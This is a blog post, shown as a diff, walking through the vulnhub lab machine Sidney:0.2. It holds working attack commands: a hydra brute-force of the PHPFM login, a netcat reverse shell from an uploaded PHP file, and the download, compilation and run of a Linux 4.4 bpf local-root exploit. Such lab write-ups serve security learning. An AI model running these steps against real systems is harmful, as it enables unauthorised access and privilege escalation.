@@ -1,0 +1,147 @@
+---
+layout: post
+title: "Sidney:0.2"
+date: 2016-07-27 10:23:04 -0500
+comments: true
+categories: [vulhub, phpfm]
+---
+
+###Tools:
+
+* netdiscover
+* Nmap
+* Wfuzz
+* Nikto
+* Burp Suite
+* Hydra
+
+
+###Vulnerabilities:
+* [PHPFM Arbitrary File Upload](https://www.exploit-db.com/exploits/26474/)
+* [Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit](https://www.exploit-db.com/exploits/39772/)
+
+
+<!--more-->
+Use netdiscover to detect target IP address
+
+`netdiscover -i eth0 -r 192.168.41.0/24`
+{% img  /images/blog/vulhub/sidney2/Selection_001.png   [title manually exploit [alt text]] %}
+
+192.168.41.153 is the target.
+
+Then run nmap to detect opening ports and running services on the target machine.
+
+`nmap -sV -v -O -A -T5 192.168.41.153 -p-`
+
+{% img  /images/blog/vulhub/sidney2/Selection_002.png   [title manually exploit [alt text]] %}
+
+Only port 80 is opening.
+
+use nikto to scan
+
+`nikto -h 192.168.41.153`	
+
+No useful info come out.
+
+```
+wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.153/FUZZ 2>/dev/null
+```
+
+still same thing.
+
+check the http://192.168.41.153, find a picture, 
+
+
+{% img  /images/blog/vulhub/sidney2/Selection_003.png   [title manually exploit [alt text]] %}
+
+check the picture info:
+
+{% img  /images/blog/vulhub/sidney2/Selection_004.png   [title manually exploit [alt text]] %}
+
+find a path:  `http://192.168.41.153/commodore64/`
+
+now use nikto to scan that path,
+
+`nikto -h http://192.168.41.153/commodore64/`
+
+{% img  /images/blog/vulhub/sidney2/Selection_005.png   [title manually exploit [alt text]] %}
+
+find an interesting file `index.php`,
+
+check that file,
+
+
+{% img  /images/blog/vulhub/sidney2/Selection_006.png   [title manually exploit [alt text]] %}
+
+get the login page, and the CMS seems PHPFM
+
+`searchsploit PHPFM`
+
+find a PHPFM Arbitrary File Upload, now I need to find a way to upload the shell. First, I have to get the access to the PHPFM
+
+In `http://192.168.41.153/commodore64`, I found:
+
+{% img  /images/blog/vulhub/sidney2/Selection_007.png   [title manually exploit [alt text]] %}
+
+I will try `robhubbard` as username. Password a C64 sound chip lowercase 3letters4digits without spaces... After checking wikipedia and more sites, seems that MOS is one of the sound chips (3 letters) Time to make our dictionary with MOS + 4 numbers and minimum+maximum of 7 words.
+
+`crunch 7 7 -t mos%%%% > test.txt`
+
+before using hydra to crack password, I use Burp to get incorrect login response,
+
+{% img  /images/blog/vulhub/sidney2/Selection_008.png   [title manually exploit [alt text]] %}
+
+
+```
+hydra -l robhubbard -P test.txt 192.168.41.153 http-post-form "/commodore64/index.php:input_username=^USER^&input_password=^PASS^:Login" -V
+```
+
+get the password `mos6518`
+
+{% img  /images/blog/vulhub/sidney2/Selection_009.png   [title manually exploit [alt text]] %}
+
+
+login, get the page:
+
+{% img  /images/blog/vulhub/sidney2/Selection_010.png   [title manually exploit [alt text]] %}
+
+set up netcat and go to `http://192.168.41.153/commodore64/reverse.php`
+
+get the shell:
+
+{% img  /images/blog/vulhub/sidney2/Selection_011.png   [title manually exploit [alt text]] %}
+
+Since the Linux kernel version here is 4.4.0
+
+`searchsploit 4.4 | grep linux`
+
+exploit found `Linux Kernel 4.4.x (Ubuntu 16.04) - double-fdput() in bpf(BPF_PROG_LOAD) Local Root Exploit`
+
+
+In Kali:
+
+```
+wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
+cp 39772.zip /var/www/html/
+```
+
+In target:
+
+upload the 39772.zip via phpfm, in the shell
+
+`find / -name 39772.zip`
+
+shows the file in `/var/www/html/commodore64/`
+
+```
+cd  /var/www/html/commodore64/
+unzip 39772.zip
+cd 39772
+tar xvf exploit.tar
+cd ebpf_mapfd_doubleput_exploit/
+./compile.sh
+./doubleput
+```
+get the root:
+
+{% img  /images/blog/vulhub/sidney2/Selection_012.png   [title manually exploit [alt text]] %}
